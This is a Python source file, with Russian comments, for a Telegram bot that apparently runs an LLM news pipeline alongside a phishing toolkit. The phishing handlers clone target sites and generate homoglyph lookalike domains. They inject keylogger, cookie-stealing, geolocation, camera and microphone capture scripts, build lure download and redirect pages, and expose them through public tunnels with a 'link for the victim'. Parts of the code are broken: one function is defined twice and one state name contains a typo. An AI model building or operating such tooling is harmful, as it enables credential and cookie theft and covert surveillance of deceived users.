            html = fish_utils.inject_scripts(
                html, geo=inject_geo, media=inject_media,
                capture_photo=capture_photo, capture_audio=capture_audio)
            if fake_domain:
                from urllib.parse import urlparse
                orig = urlparse(url).netloc
                fake = fish_utils.generate_homoglyph_domain(orig)
                html = fish_utils.replace_domain_in_html(html, orig, fake)
            pid = fish_downloader.save_page(html, url, 'single')
            fish_downloader.set_active_page(pid)
            send_message(
                "✅ Страница сохранена и активирована!\nID: <code>{}</code>".format(pid),
                chat_id, reply_markup=kb([back_btn("menu_fish")]))
        except Exception as e:
            send_message("❌ Ошибка: {}".format(e), chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
    _run_in_thread(_do)


def _fish_handle_wait_state(state, text, chat_id):
    """Обрабатывает состояния ожидания для фишинг-модуля. Возвращает True если обработано."""
    if not state.startswith('fish_') or not FISH_ENABLED:
        return False

    if state == 'fish_load_url':
        _fish_process_load(chat_id, text)

def _fish_handle_wait_state(state, text, chat_id):
    if not state.startswith('fish_') or not FISH_ENABLED:
        return False

    if state == 'fish_load_url':
        _fish_process_load(chat_id, text)
        return True

    elif state == 'fish_fullsite_url':
        target_url = text.strip()
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        send_message("🌐 Скачиваю весь сайт... (может занять минуту)", chat_id)

        def _do_fs(url_to_download):
            try:
                index_path, site_dir = fish_downloader.download_full_site(url_to_download, _fish_cfg.DOWNLOADS_DIR)
                pid = fish_downloader.save_full_site(url_to_download, site_dir)
                _fish_user_data[chat_id] = {
                    'full_site_page_id': pid,
                    'site_index_path': index_path,
                    'site_url': url_to_download
                }
                _fish_show_options(chat_id)
            except Exception as e:
                send_message("❌ Ошибка: {}".format(e), chat_id)

        _run_in_thread(_do_fs, target_url)
        return True

    elif state == 'fish_load_geo_url':
        _fish_process_load(chat_id, text, inject_geo=True)
        return True

    elif state == 'fis  h_load_cam_url':
        _fish_process_load(chat_id, text, inject_media=True, capture_photo=True, capture_audio=True)

    elif state == 'fish_load_mic_url':
        _fish_process_load(chat_id, text, inject_media=True, capture_photo=True, capture_audio=True)

    elif state == 'fish_payload_url':
        url = text if text.startswith(('http://', 'https://')) else 'https://' + text
        html = fish_utils.generate_redirect_page(url)
        pid = fish_downloader.save_page(html, "payload_{}".format(url), 'redirect')
        fish_downloader.set_active_page(pid)
        send_message("✅ Payload-редирект создан! ID: <code>{}</code>".format(pid),
                     chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_use_page':
        ok = fish_downloader.set_active_page(text.strip())
        send_message("✅ Активирована: {}".format(text) if ok else "❌ Страница не найдена: {}".format(text),
                     chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_clone_page':
        new_id = fish_downloader.clone_page(text.strip())
        send_message("✅ Клон создан: <code>{}</code>".format(new_id) if new_id else "❌ Страница не найдена",
                     chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_gen_domain':
        domain = text.strip()
        fake = fish_utils.generate_homoglyph_domain(domain)
        send_message(
            "🔀 Оригинал: <code>{}</code>\n🎭 Похожий: <code>{}</code>".format(domain, fake),
            chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_iframe_url':
        opts = _fish_user_opts.setdefault(chat_id, {})
        url = text if text.startswith(('http://', 'https://')) else 'https://' + text
        opts['iframe_url'] = url
        opts['iframe_phish'] = True
        _fish_send_options(chat_id)

    else:
        return False
    return True


def _fish_handle_selfile(file_id_str, chat_id):
    """Обработка выбора файла для страницы скачивания."""
    try:
        fid = int(file_id_str)
    except Exception:
        send_message("❌ Неверный ID", chat_id)
        return
    _fish_user_data[chat_id] = {'file_id': fid}
    _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })
    _fish_send_options(chat_id)


def _fish_handle_opt(toggle, chat_id):
    """Переключает опции инжекций."""
    opts = _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })
    if toggle == 'geo':
        opts['geo'] = not opts['geo']
    elif toggle == 'cam':
        opts['cam'] = not opts['cam']
    elif toggle == 'mic':
        opts['mic'] = not opts['mic']
    elif toggle == 'auto':
        opts['auto'] = not opts['auto']
    elif toggle == 'keylogger':
        opts['keylogger'] = not opts.get('keylogger', False)
    elif toggle == 'cookies':
        opts['steal_cookies'] = not opts.get('steal_cookies', False)
    elif toggle == 'sysinfo':
        opts['system_info'] = not opts.get('system_info', False)
    elif toggle == 'iframe':
        current = opts.get('iframe_phish', False)
        opts['iframe_phish'] = not current
        if not current:
            # Нужен URL
            _wait_state[chat_id] = 'fish_iframe_url'
            send_message("Введи URL оригинальной страницы для iframe (например, https://vk.com):",
                         chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))
            return
    elif toggle == 'generate':
        # Проверяем, есть ли путь к скачанному сайту (full_site)
        full_page_id = _fish_user_data.get(chat_id, {}).get('full_site_page_id')
        site_path = _fish_user_data.get(chat_id, {}).get('site_index_path')
        
        if full_page_id and site_path:
            # Читаем HTML
            with open(site_path, 'r', encoding='utf-8') as f:
                html = f.read()
            # Внедряем скрипты
            html = fish_utils.inject_scripts(
                html,
                geo=opts.get('geo', False),
                media=opts.get('cam', False) or opts.get('mic', False),
                capture_photo=opts.get('cam', False),
                capture_audio=opts.get('mic', False),
                keylogger=opts.get('keylogger', False),
                steal_cookies=opts.get('steal_cookies', False),
                system_info=opts.get('system_info', False),
                iframe_phish=opts.get('iframe_phish', False),
                iframe_url=opts.get('iframe_url'),
            )
            
            # Сохраняем модифицированный HTML как новую одиночную страницу
            # (или можно заменить исходный, но лучше создать новую)
            new_pid = fish_downloader.save_page(html, _fish_user_data[chat_id]['site_url'], 'single')
            
            # Активируем её
            fish_downloader.set_active_page(new_pid)
            
            # Очищаем временные данные
            _fish_user_data.pop(chat_id, None)
            
            # Отправляем сообщение об успехе
            base_url = (fish_bot_state.tunnel_url or
                        (fish_bot_state.bore_url if hasattr(fish_bot_state, 'bore_url') else None) or
                        ("http://localhost:{}".format(_fish_cfg.SERVER_PORT)
                         if fish_bot_state.server_running else None))
            url_line = "\n\n🔗 <b>Ссылка для жертвы:</b>\n<code>{}/</code>".format(base_url) if base_url else ""
            
            send_message(
                "✅ <b>Сайт с инжекциями создан и активирован!</b>\n"
                "ID: <code>{}</code>{}\n\n"
                "<i>Страница активирована и готова к работе.</i>".format(new_pid, url_line),
                chat_id,
                reply_markup=kb(
                    [btn("📱 QR-код", "fish:qr"), btn("📊 Статистика", "fish:stats")],
                    [btn("🌐 Меню фишинга", "menu_fish")],
                ))
            return
        
        # ... остальной код для обычного файла-приманки

        # --- Если это обычный файл-приманка (нет site_path) ---
        fid = _fish_user_data.get(chat_id, {}).get('file_id')
        if not fid:
            send_message("❌ Файл не выбран", chat_id)
            return
        files = fish_db.get_all_files()
        file_info = next((f for f in files if f['id'] == fid), None)
        if not file_info:
            send_message("❌ Файл не найден", chat_id)
            return
        fname = file_info['original_name']

        # Здесь должен быть ваш существующий код для создания страницы скачивания
        # (использующий шаблон, инжекции и т.д.) – вставьте его сюда
        # Пример (адаптируйте под вашу реализацию):
        dl_tmpl_path = _fish_cfg.DOWNLOAD_TEMPLATE_PATH
        if os.path.exists(dl_tmpl_path):
            with open(dl_tmpl_path, 'r', encoding='utf-8') as f:
                html = f.read()
        else:
            html = ("""<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Скачать {fn}</title></head>
<body><h1>📥 {fn}</h1><a href='/download/{fid}'>Скачать</a></body></html>""").format(fn=fname, fid=fid)

        html = html.replace('{file_id}', str(fid)).replace('{file_name}', fname)
        html = fish_utils.inject_scripts(
            html,
            geo=opts.get('geo', False),
            media=opts.get('cam', False) or opts.get('mic', False),
            capture_photo=opts.get('cam', False),
            capture_audio=opts.get('mic', False),
            download_file_id=fid,
            auto_download=opts.get('auto', False),
            keylogger=opts.get('keylogger', False),
            steal_cookies=opts.get('steal_cookies', False),
            system_info=opts.get('system_info', False),
            iframe_phish=opts.get('iframe_phish', False),
            iframe_url=opts.get('iframe_url'),
        )
        pid = fish_downloader.save_page(html, "dl_page_{}".format(fid), 'download')
        fish_downloader.set_active_page(pid)
        _fish_user_data.pop(chat_id, None)

        base_url = (fish_bot_state.tunnel_url or
                    (fish_bot_state.bore_url if hasattr(fish_bot_state, 'bore_url') else None) or
                    ("http://localhost:{}".format(_fish_cfg.SERVER_PORT)
                     if fish_bot_state.server_running else None))
        url_line = "\n\n🔗 <b>Ссылка для жертвы:</b>\n<code>{}/</code>".format(base_url) if base_url else ""

        send_message(
            "✅ <b>Страница скачивания создана!</b>\n"
            "ID: <code>{}</code>  |  Файл: <b>{}</b>{}\n\n"
            "<i>Страница активирована и готова к работе.</i>".format(pid, fname, url_line),
            chat_id,
            reply_markup=kb(
                [btn("📱 QR-код", "fish:qr"), btn("📊 Статистика", "fish:stats")],
                [btn("🌐 Меню фишинга", "menu_fish")],
            ))
        return

    _fish_send_options(chat_id)


# ════════════════════════════════════════════════════════════

def _help_text():
    styles_list = "\n".join(
        "{} <b>{}</b> — {}".format(s['emoji'], s['name'], s['description'])
        for s in STYLES.values()
    )
    return (
        "❓ <b>АВТОМУВИ — справка</b>\n\n"
        "Управляй всем через кнопки меню — команды вводить не нужно.\n\n"
        "<b>Команды (если нужно):</b>\n"
        "/menu — главное меню\n"
        "/run — полный цикл\n"
        "/parse — только парсинг\n"
        "/process — обработать накопленное\n"
        "/voices — список голосов TTS\n"
        "/setprompt — задать свой промт\n"
        "/llm [провайдер] — сменить провайдера\n"
        "/fix — исправить ошибку в коде (авто-агент)\n"
        "/analyze — анализ кода\n"
        "/setllm провайдер модель [key]\n"
        "/provider — быстрая смена LLM\n"
        "/env — текущие настройки\n\n"
        "<b>🎣 Фишинг-команды:</b>\n"
        "/fish — открыть фишинг-меню\n"
        "/upload — загрузить файл-приманку\n"
        "/files — список загруженных файлов\n"
        "/dl — создать страницу скачивания\n"
        "/fishstats — статистика фишинга\n"
        "/tunnel — запустить CF-туннель\n"
        "/server — вкл/выкл Flask-сервер\n\n"
        "<b>LLM провайдеры:</b>\n"
        "openai | gemini | mistral | claude\n"
        "deepseek | groq | xai | kimi | ollama\n\n"
        "<b>Стили переписывания:</b>\n" + styles_list
    )


# ══════════════════════════════════════════════════════════════
#  SCHEDULER
# ══════════════════════════════════════════════════════════════

def scheduled_cycle():
    print("\n⏰ Авто-запуск...", flush=True)
    send_message("⏰ Автоматический запуск по расписанию...")
    try:
        parse_all()
        run_pipeline()
    except Exception as e:
        send_message("❌ Ошибка авто-цикла: {}".format(e))

def _run_scheduler():
    while True:
        schedule.run_pending()
        time.sleep(30)


# ══════════════════════════════════════════════════════════════
#  POLLING LOOP
# ══════════════════════════════════════════════════════════════


def handle_photo(msg, chat_id):
    """Обрабатывает фото от пользователя — Vision анализ."""
    if not is_authenticated(chat_id):
        return

    photos  = msg.get('photo', [])
    caption = msg.get('caption', '').strip()

    # Берём самое большое фото
    best = max(photos, key=lambda p: p.get('file_size', 0))
    file_id = best.get('file_id', '')

    if not file_id:
        return

    # ── Агент-сессия: накапливаем фото как файлы ─────────────────────────
    try:
        from agent_session import get_session, has_active_session, STAGE_WAIT_FILES
        if has_active_session(chat_id):
            sess = get_session(chat_id)
            if sess and sess.stage == STAGE_WAIT_FILES:
                fname = f"photo_{int(time.time())}.jpg"
                dest  = os.path.join(sess.output_dir, fname)
                try:
                    download_file(file_id, dest)
                    sess.add_file(dest, fname, 'image')
                    send_message(
                        f"🖼 Фото принято ({len(sess.files)} всего)\n"
                        "Отправь ещё или напиши <b>готово</b>.",
                        chat_id,
                        reply_markup=kb(
                            [btn("🚀 Готово — запустить","_agent_go")],
                            [btn("❌ Отмена","adm:close_agent")],
                        )
                    )
                    _wait_state[chat_id] = 'adm_agent_task'
                except Exception as e:
                    send_message(f"⚠️ Фото не сохранено: {e}", chat_id)
                return
    except ImportError:
        pass
    if is_active(chat_id):
        question = caption or 'Опиши что на этом изображении'
        send_message("👁 Анализирую изображение...", chat_id)
        def _do():
            try:
                from agent_tools_registry import tool_vision_telegram
                result = tool_vision_telegram(
                    {'file_id': file_id, 'question': question, 'mode': 'describe'},
                    chat_id=chat_id
                )
                # Убираем HTML теги для ответа
                import re
                clean = re.sub(r'<[^>]+>', '', result)
                send_message(clean[:3000], chat_id, reply_markup=chat_control_keyboard())
            except Exception as e:
                send_message(f"❌ Vision ошибка: {e}", chat_id)
        _run_in_thread(_do)
        return

    # Без активной сессии — показываем меню выбора действия
    kb_photo = kb(
        [btn("👁 Описать изображение",    f"vision:{file_id}:describe"),
         btn("📝 Извлечь текст (OCR)",     f"vision:{file_id}:ocr")],
        [btn("🔍 Найти объекты",           f"vision:{file_id}:detect"),
         btn("❓ Задать вопрос",           f"vision:{file_id}:qa")],
        [btn("◀️ Меню",                    "menu")],
    )
    send_message(
        "📷 <b>Фото получено.</b> Что сделать?",
        chat_id, reply_markup=kb_photo
    )
    # Сохраняем file_id для вопроса
    _wait_state[chat_id] = f'vision_qa:{file_id}'


def handle_document(msg, chat_id):
    """Обрабатывает файл присланный пользователем."""
    # ══ ГЕЙТ АВТОРИЗАЦИИ ══
    if not is_authenticated(chat_id):
        try:
            step, _ = auth_state_get(chat_id)
        except Exception:
            step = 'idle'
        if step == 'idle':
            auth_start(chat_id)
        else:
            send_message("🔒 Сначала пройди авторизацию.", chat_id)
        return
    # ══ КОНЕЦ ГЕЙТА ═══════

    # ── Агент-сессия: накапливаем файлы ────────────────────────────────────
    try:
        from agent_session import get_session, has_active_session, detect_file_type, STAGE_WAIT_FILES
        sess = get_session(chat_id)
        if sess and sess.stage == STAGE_WAIT_FILES:
            doc      = msg.get('document', {})
            file_id  = doc.get('file_id', '')
            filename = doc.get('file_name', f'file_{int(time.time())}')
            ftype    = detect_file_type(filename)
            try:
                dest = os.path.join(sess.output_dir, filename)
                if file_id: download_file(file_id, dest)
                sess.add_file(dest, filename, ftype)
                send_message(
                    f"📎 <b>{filename}</b> ({ftype}) принят\n"
                    f"Файлов: {len(sess.files)}\n\n"
                    "Отправь ещё или напиши <b>готово</b>",
                    chat_id,
                    reply_markup=kb(
                        [btn("🚀 Готово — запустить", "_agent_go")],
                        [btn("❌ Отмена", "proj_mode:cancel")],
                    )
                )
                _wait_state[chat_id] = 'code_session'
            except Exception as e:
                send_message(f"⚠️ Файл: {e}", chat_id)
            return
    except ImportError:
        pass
    doc      = msg.get('document', {})
    file_id  = doc.get('file_id')
    filename = doc.get('file_name', 'file')
    filesize = doc.get('file_size', 0)
    caption  = msg.get('caption', '')

    # ── Приоритет 1: ждём файл для fish-модуля ─────────────────────────
    # ── Приоритет 0: ждём HTML-страницу для фишинга ────────────────────
    if _wait_state.get(chat_id) == 'fish_upload_html':
        _wait_state.pop(chat_id, None)

        # Проверяем расширение
        if not filename.lower().endswith(('.html', '.htm')):
            send_message(
                "❌ Ожидается <b>.html</b> файл, а не <b>{}</b>\n\n"
                "Отправь HTML-файл или нажми отмену.".format(
                    filename.rsplit('.', 1)[-1].upper() if '.' in filename else '???'),
                chat_id,
                reply_markup=kb(
                    [btn("🔄 Попробовать снова", "fish:upload_html")],
                    [btn("❌ Отмена", "menu_fish")],
                ))
            return

        if filesize > 5 * 1024 * 1024:
            send_message("❌ HTML-файл > 5 MB — слишком большой.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
            return

        send_message("📥 Загружаю <b>{}</b>...".format(filename), chat_id)
        dest_path = get_dest_path(filename)
        ok = download_file(file_id, dest_path)
        if not ok:
            send_message("❌ Не удалось скачать файл.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
            return

        # Читаем HTML
        try:
            with open(dest_path, 'r', encoding='utf-8', errors='replace') as _f:
                html_content = _f.read()
        except Exception as e:
            send_message("❌ Не могу прочитать файл: {}".format(e), chat_id)
            return

        # Сохраняем HTML в памяти для инжекций
        _fish_user_data[chat_id] = {
            'html_content': html_content,
            'html_filename': filename,
            'source': 'upload',
        }
        _fish_user_opts.setdefault(chat_id, {
            'geo': False, 'cam': False, 'mic': False, 'auto': False,
            'keylogger': False, 'steal_cookies': False, 'system_info': False,
            'iframe_phish': False, 'iframe_url': None,
        })

        # Краткая инфа о файле
        lines_count = html_content.count('\n')
        has_form = '<form' in html_content.lower()
        has_input = '<input' in html_content.lower()
        has_pass = 'password' in html_content.lower() or 'passwd' in html_content.lower()
        flags = []
        if has_form:  flags.append("📋 форма")
        if has_input: flags.append("⌨️ поля ввода")
        if has_pass:  flags.append("🔑 поле пароля")

        send_message(
            "✅ <b>HTML загружен:</b> <code>{}</code>\n"
            "Размер: {} KB  |  Строк: {}\n"
            "{}\n\n"
            "Теперь выбери инжекции и нажми 🚀 <b>Создать</b>:".format(
                filename, filesize // 1024, lines_count,
                "Обнаружено: " + ", ".join(flags) if flags else ""),
            chat_id)

        # Показываем меню инжекций — переиспользуем _fish_send_options
        # но с пометкой что источник — загруженный файл
        _fish_send_options_html(chat_id)
        return

    # ── Приоритет 1: ждём файл для fish-модуля ─────────────────────────
    if _wait_state.get(chat_id) == 'fish_upload_file':
        _wait_state.pop(chat_id, None)
        if filesize > 20 * 1024 * 1024:
            send_message("❌ Файл > 20 MB, Telegram не позволяет.", chat_id)
            return
        send_message("📥 Загружаю <b>{}</b>...".format(filename), chat_id)
        dest_path = get_dest_path(filename)
        ok = download_file(file_id, dest_path)
        if not ok:
            send_message("❌ Не удалось скачать файл.", chat_id)
            return
        # Сохраняем в fish БД
        saved_name = os.path.basename(dest_path)
        db_id = fish_db.save_file_to_db(saved_name, filename, filesize)
        send_message(
            "✅ Файл <b>{}</b> ({} KB) загружен!\n"
            "ID: <code>{}</code>\n\n"
            "Теперь выбери его как приманку через меню.".format(
                filename, filesize // 1024, db_id),
            chat_id, reply_markup=kb(
                [btn("📂 Мои файлы", "fish:files"),
                 btn("◀️ Меню", "menu_fish")]
            ))
        return

    # ── Приоритет 2: ждём файл для send_to (отправка файла другому юзеру) ──
    if _wait_state.get(chat_id, '').startswith('send_text:file'):
        state = _wait_state.pop(chat_id)
        task  = (_pending_agent_task.pop(chat_id, {}) or {})
        target = task.get('target', '')
        if not target:
            send_message("❌ Получатель не указан. Начни заново.", chat_id)
            return
        dp = get_dest_path(filename)
        ok_dl = download_file(file_id, dp)
        if not ok_dl:
            send_message("❌ Не удалось скачать файл.", chat_id)
            return
        send_message("📤 Отправляю <b>{}</b>...".format(filename), chat_id)
        ok2, err2 = send_file_to(target, dp)
        msg_r = "✅ Файл отправлен → <code>{}</code>".format(target) if ok2 else "❌ {}".format(err2)
        send_message(msg_r, chat_id, reply_markup=kb([btn("📨 Ещё", "menu_send"), back_btn()]))
        return

    # ── Лимит Telegram Bot API — 20 MB ─────────────────────────────────
    if filesize > 20 * 1024 * 1024:
        send_message(
            "❌ Файл слишком большой ({:.1f} MB). Telegram позволяет скачивать до 20 MB.".format(
                filesize / 1024 / 1024), chat_id)
        return

    send_message("📥 Скачиваю <b>{}</b>...".format(filename), chat_id)

    dest_path = get_dest_path(filename)
    ok = download_file(file_id, dest_path)

    if not ok:
        send_message("❌ Не удалось скачать файл. Попробуй ещё раз.", chat_id)
        return

    send_message("🔍 Анализирую файл...", chat_id)

    # Контекст: если активна ИИ-сессия — передаём caption + историю
    hint = caption or ''
    # Используем chat_agent сессию (dict), не agent_session (AgentSession объект)
    try:
        from chat_agent import get_session as _chat_get_session
        chat_sess = _chat_get_session(chat_id)
    except Exception:
        chat_sess = None
    if chat_sess and isinstance(chat_sess, dict) and chat_sess.get('mode') == 'chat' and not hint:
        history = chat_sess.get('history', [])
        if history and history[-1]['role'] == 'user':
            hint = history[-1]['content']

    try:
        result = analyze_file(dest_path, filename, user_hint=hint)
    except Exception as e:
        result = "❌ Ошибка анализа: {}".format(e)

    # ── КОДЕР-СЕССИЯ: анализируем → спрашиваем что дальше ──
    if chat_sess and isinstance(chat_sess, dict) and chat_sess.get('mode') == 'code':
        from chat_agent import add_to_history
        add_to_history(chat_id, 'user', '[Файл: {}] {}'.format(filename, hint or 'анализ'))
        add_to_history(chat_id, 'assistant', result[:500])

        _pending_file[chat_id] = {
            'path':     dest_path,
            'filename': filename,
            'analysis': result,
        }

        analysis_preview = result[:3500] if len(result) > 3500 else result
        send_message(
            "📂 <b>{}</b>\n\n{}\n\n<b>Что делать дальше?</b>".format(filename, analysis_preview),
            chat_id, reply_markup=after_file_keyboard()
        )
        return

    # Если активна чат-сессия — добавляем в историю
    if chat_sess and isinstance(chat_sess, dict):
        from chat_agent import add_to_history
        add_to_history(chat_id, 'user', '[Файл: {}] {}'.format(filename, hint))
        add_to_history(chat_id, 'assistant', result[:500])

    # Telegram лимит 4096 символов на сообщение
    if len(result) > 4096:
        # Отправляем частями
        chunks = [result[i:i+4000] for i in range(0, len(result), 4000)]
        for i, chunk in enumerate(chunks):
            suffix = " ({}/{})".format(i+1, len(chunks)) if len(chunks) > 1 else ""
            send_message(chunk + suffix, chat_id,
                        reply_markup=chat_control_keyboard() if sess else kb(
                            [btn("📋 Меню", "menu")]
                        ))
    else:
        send_message(result, chat_id,
                    reply_markup=chat_control_keyboard() if sess else kb(
                        [btn("📋 Меню", "menu"),
                         btn("💬 Обсудить в чате", "agent_chat_start")]
                    ))



def _show_models_page(chat_id, models, page=0, msg_id=None):
    """Показывает страницу бесплатных моделей с кнопками."""
    text, buttons_data = format_free_models_keyboard(models, page=page)

    # Конвертируем buttons_data в kb() формат
    rows = []
    for row in buttons_data:
        rows.append([btn(label, cb) for label, cb in row])
    rows.append([back_btn("menu_llm")])

    markup = kb(*rows) if rows else None
    if msg_id:
        edit_message(chat_id, msg_id, text, reply_markup=markup)
    else:
        send_message(text, chat_id, reply_markup=markup)


def poll():
    offset = 0
    print("🤖 Polling запущен. Отправь /menu боту.", flush=True)

    # Авто-проверка текущего провайдера при старте (только читаем, не меняем)
    def _startup_check():
        import time as _t; _t.sleep(3)
        provider = config.LLM_PROVIDER
        model    = config.LLM_MODEL
        # Берём ключ специфичный для провайдера
        from llm_checker import _get_key_for_provider
        key = _get_key_for_provider(provider)
        result = check_provider(provider, api_key=key)
        if result['ok']:
            print("  ✅ LLM {}/{} — OK".format(provider, model), flush=True)
        else:
            err = result['error'] or 'недоступен'
            no_key = not key
            if no_key:
                print("  ⚠️ LLM {} — нет ключа в .env".format(provider), flush=True)
            else:
                print("  ❌ LLM {} — {}".format(provider, err), flush=True)
            print("     → /menu → 🧠 LLM → 🔍 Проверить провайдеры", flush=True)
    _run_in_thread(_startup_check)
    while not _gs.poll_should_stop():
        try:
            updates = get_updates(offset)
            for upd in updates:
                offset = upd['update_id'] + 1  # ← подтверждаем апдейт СРАЗУ

                # Inline-кнопка нажата
                if 'callback_query' in upd:
                    try:
                        handle_callback(upd['callback_query'])
                    except Exception as e:
                        print("⚠️ Callback dispatch error: {}".format(e), flush=True)
                    continue

                # Обычное сообщение (текст или файл)
                msg  = upd.get('message', {})
                cid  = str(msg.get('chat', {}).get('id', ''))
                if not cid:
                    continue

                # Файл / документ
                doc = msg.get('document')
                if doc:
                    try:
                        handle_document(msg, cid)
                    except Exception as e:
                        send_message("❌ Ошибка обработки файла: {}".format(e), cid)
                    continue

                # Фото — анализ через Vision если агент активен
                photos = msg.get('photo')
                if photos:
                    try:
                        handle_photo(msg, cid)
                    except Exception as e:
                        send_message("❌ Ошибка обработки фото: {}".format(e), cid)
                    continue

                # Текст
                text = msg.get('text', '')
                if text:
                    try:
                        # Пробрасываем данные профиля для auth_start
                        from_data = msg.get('from', {})
                        handle_text(text, cid,
                                    username=from_data.get('username'),
                                    first_name=from_data.get('first_name'))
                    except Exception as e:
                        send_message("❌ Ошибка: {}".format(e), cid)

        except Exception as e:
            print("⚠️ Poll outer error: {}".format(e), flush=True)
        time.sleep(2)


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def _validate_startup_config():
    """Проверяет конфиг при старте — авто-исправляет известные проблемы."""
    from llm_checker import RECOMMENDED
    provider = config.LLM_PROVIDER
    model    = config.LLM_MODEL
    rec = RECOMMENDED.get(provider, [])
    if rec and model not in rec:
        suggested = rec[0]
        print(f"  ⚠️ Модель '{model}' недоступна у {provider}. Авто: '{suggested}'", flush=True)
        _update_env('LLM_MODEL', suggested)
        config.reload()
    from llm_client import _PROVIDER_KEY_MAP
    key_attr = _PROVIDER_KEY_MAP.get(provider, 'LLM_API_KEY')
    has_key  = bool(getattr(config, key_attr, '') or config.LLM_API_KEY)
    if not has_key and provider != 'ollama':
        print(f"  ⚠️ Нет API ключа для {provider}! /menu → 🧠 LLM → {provider} → 🔑", flush=True)


def main():
    print(config.startup_banner(), flush=True)
    print(f"📁 Директория: {config.BASE_DIR}", flush=True)
    _validate_startup_config()
    print("🧠 LLM: {} / {}".format(config.LLM_PROVIDER, config.LLM_MODEL), flush=True)
    print("🎙  TTS: {} / {}".format(config.TTS_PROVIDER, config.TTS_VOICE), flush=True)

    # ── Graceful shutdown ───────────────────────────────────────────────────
    if GS_ENABLED:
        _gs.setup()
        _gs.register_notify(send_message)

    init_db()                     # БД новостей
    init_auth_db()

    # ── Structured logging ──────────────────────────────────────────────────
    if SLOG_ENABLED:
        LOG.info("АВТОМУВИ стартует", extra={'llm': config.LLM_PROVIDER})

    # ── Task queue workers ──────────────────────────────────────────────────
    if QUEUE_ENABLED:
        start_workers(n=2)

    # Восстанавливаем сессии после рестарта
    try:
        from chat_agent import restore_sessions
        restored_ids = restore_sessions()
        if restored_ids:
            def _notify_restored():
                import time as _t; _t.sleep(5)  # даём боту время стартовать
                for cid in restored_ids:
                    try:
                        from chat_agent import session_info
                        info = session_info(cid)
                        if info:
                            mode_name = "💬 Чат" if info['mode'] == 'chat' else "💻 Агент-кодер"
                            send_message(
                                f"🔄 <b>Бот перезапустился.</b>\n"
                                f"Твоя сессия {mode_name} восстановлена.\n"
                                f"История: {info['messages']} сообщений.\n\n"
                                f"<i>Продолжай как ни в чём не бывало.</i>",
                                cid, reply_markup=chat_control_keyboard()
                            )
                    except Exception:
                        pass
            threading.Thread(target=_notify_restored, daemon=True).start()
    except Exception as _re:
        print(f"  ⚠️ Не удалось восстановить сессии: {_re}", flush=True)

    # Удаляем вебхук если был — иначе getUpdates не работает
    delete_webhook()

    schedule.every(config.PARSE_INTERVAL_HOURS).hours.do(scheduled_cycle)
    threading.Thread(target=_run_scheduler, daemon=True).start()

    # Инициализация модуля авторизации
    # Инициализация модуля авторизации (синхронная)
    init_auth_db()

    # ── Admin Web Panel ──────────────────────────────────────────────────────
    try:
        from admin_web import start_admin_web
        start_admin_web()
    except Exception as _awe:
        print(f"  ⚠️ Admin Web не запустился: {_awe}", flush=True)

    # ── Watchdog для туннелей: авто-перезапуск при обрыве ───────────
    def _tunnel_watchdog():
        """Следит за bore/serveo, перезапускает если упали."""
        import time as _tw
        while True:
            _tw.sleep(30)
            if not FISH_ENABLED:
                continue
            try:
                # bore
                if (fish_bot_state.bore_process is not None and
                        fish_bot_state.bore_process.poll() is not None):
                    print("  🔄 bore упал, перезапускаю...", flush=True)
                    fish_bot_state.bore_process = None
                    fish_bot_state.bore_url     = None
                    # Тихий перезапуск bore
                    port = _fish_cfg.SERVER_PORT
                    if shutil.which("bore"):
                        proc = subprocess.Popen(
                            ["bore", "local", str(port), "--to", "bore.pub"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1,
                        )
                        fish_bot_state.bore_process = proc
                        import re as _re2
                        for line in proc.stdout:
                            m = _re2.search(r"bore\.pub:(\d+)", line)
                            if m:
                                fish_bot_state.bore_url = "http://bore.pub:{}".format(m.group(1))
                                print("  ✅ bore перезапущен: {}".format(fish_bot_state.bore_url), flush=True)
                                break

                # serveo
                if (fish_bot_state.serveo_process is not None and
                        fish_bot_state.serveo_process.poll() is not None):
                    print("  🔄 serveo упал, перезапускаю...", flush=True)
                    fish_bot_state.serveo_process = None
                    fish_bot_state.serveo_url     = None
                    if shutil.which("ssh"):
                        proc = subprocess.Popen(
                            ["ssh", "-o", "StrictHostKeyChecking=no",
                             "-o", "ServerAliveInterval=30",
                             "-o", "ServerAliveCountMax=3",
                             "-o", "ExitOnForwardFailure=yes",
                             "-R", "80:localhost:{}".format(_fish_cfg.SERVER_PORT),
                             "serveo.net"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1,
                        )
                        fish_bot_state.serveo_process = proc
                        import re as _re3
                        for line in proc.stdout:
                            m = _re3.search(r"https://[a-zA-Z0-9-]+\.serveo\.net", line)
                            if m:
                                fish_bot_state.serveo_url = m.group(0)
                                print("  ✅ serveo перезапущен: {}".format(fish_bot_state.serveo_url), flush=True)
                                break
            except Exception as _we:
                print("  ⚠️ tunnel watchdog: {}".format(_we), flush=True)

    threading.Thread(target=_tunnel_watchdog, daemon=True, name="tunnel-watchdog").start()

    # Startup broadcast to admin
    admin_ids = []
    try:
        from admin_module import _load_admin_ids
        admin_ids = list(_load_admin_ids())
    except Exception:
        pass
    for _aid in admin_ids[:3]:  # не спамим
        try:
            send_message(
                "🤖 <b>BlackBugsAI запущен!</b>\n"
                "LLM: {} / {}\n"
                "TTS: {} / {}\n\n"
                "👇 Нажми меню для управления".format(
                    config.LLM_PROVIDER, config.LLM_MODEL,
                    config.TTS_PROVIDER, config.TTS_VOICE),
                _aid, reply_markup=menu_keyboard(_aid)
            )
        except Exception:
            pass

    # ── Запускаем Flask (фишинг веб-сервер) в отдельном потоке ──
